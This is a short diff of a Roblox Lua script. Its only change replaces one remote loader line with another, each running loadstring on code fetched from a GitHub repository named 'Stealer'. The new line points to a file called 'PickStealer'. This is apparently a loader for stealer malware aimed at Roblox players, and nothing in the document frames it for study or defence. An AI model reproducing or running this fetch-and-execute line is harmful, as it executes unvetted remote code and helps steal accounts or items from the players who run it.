@@ -1,6 +1,6 @@
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Shalangtalagas/Stealer/refs/heads/main/xscripts", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Shalangtalagas/Stealer/refs/heads/main/PickStealer", true))()
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
